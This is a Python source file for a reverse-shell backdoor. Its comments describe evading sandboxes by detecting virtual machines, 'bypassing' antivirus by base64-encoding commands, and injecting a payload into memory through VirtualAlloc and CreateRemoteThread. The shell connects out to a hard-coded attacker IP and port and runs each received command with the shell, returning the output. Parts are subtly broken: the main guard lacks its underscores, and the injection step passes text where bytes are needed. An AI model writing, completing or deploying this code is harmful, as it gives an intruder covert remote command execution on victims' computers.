import socket
import subprocess
import os
import base64
import platform
import sys
import time
import random
import psutil
import ctypes

# Function to detect virtual machines (VM) more accurately
def is_vm():
    try:
        vm_check = False
        # Check common VM indicators like registry keys or specific processes
        if "microsoft" in platform.release().lower() or "virtual" in platform.uname().machine.lower():
            vm_check = True

        # Further detection through processes (e.g., VirtualBox, VMware, Hyper-V)
        vm_processes = ["VBoxService", "vmtoolsd", "vmmem", "vmhgfs-fuse", "hyperv"]
        for proc in psutil.process_iter():
            try:
                if any(vm in proc.name().lower() for vm in vm_processes):
                    vm_check = True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return vm_check
    except Exception as e:
        return False

# Function to bypass Anti-Virus (AV) by using dynamic encryption
def encrypt_payload(payload):
    try:
        # Using a simple Base64 encryption for demonstration
        encrypted = base64.b64encode(payload.encode()).decode()
        return encrypted
    except Exception as e:
        return None

def decrypt_payload(encrypted_payload):
    try:
        decrypted = base64.b64decode(encrypted_payload).decode()
        return decrypted
    except Exception as e:
        return None

# Function to inject a malicious payload (example: reflective loading)
def inject_payload(payload):
    try:
        if platform.system() == "Windows":
            # Use ctypes for Windows process injection (example)
            ctypes.windll.kernel32.VirtualAlloc.argtypes = [ctypes.c_size_t, ctypes.c_size_t, ctypes.c_uint, ctypes.c_uint]
            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p

            # Allocate memory for the payload
            payload_address = ctypes.windll.kernel32.VirtualAlloc(0, len(payload), 0x1000, 0x40)
            ctypes.windll.kernel32.RtlMoveMemory(payload_address, payload, len(payload))

            # Create a thread to run the payload
            ctypes.windll.kernel32.CreateRemoteThread(0, 0, 0, payload_address, 0, 0, 0)
        return True
    except Exception as e:
        return False

# Main function to execute the shell and bypass security systems
def main():
    if is_vm():
        sys.exit()  # Exit if running in a VM environment

    IP = "192.168.58.146"  # Attacker's IP address
    PORT = 8080  # Attacker's listening port

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((IP, PORT))
    except:
        time.sleep(5)
        return

    while True:
        try:
            # Receive the encrypted command
            encrypted_data = s.recv(2048).decode()
            data = decrypt_payload(encrypted_data)

            if not data:
                continue  # Skip invalid or empty commands

            if data.lower() == "exit":
                break
            elif data.startswith("cd "):
                try:
                    os.chdir(data[3:])
                    s.send(b"Directory changed.\n")
                except Exception as e:
                    s.send(str(e).encode())
                continue

            # Execute the command and send back the result
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out = proc.stdout.read() + proc.stderr.read()
            s.send(out)
        except:
            continue

    s.close()

if name == "main":
    main()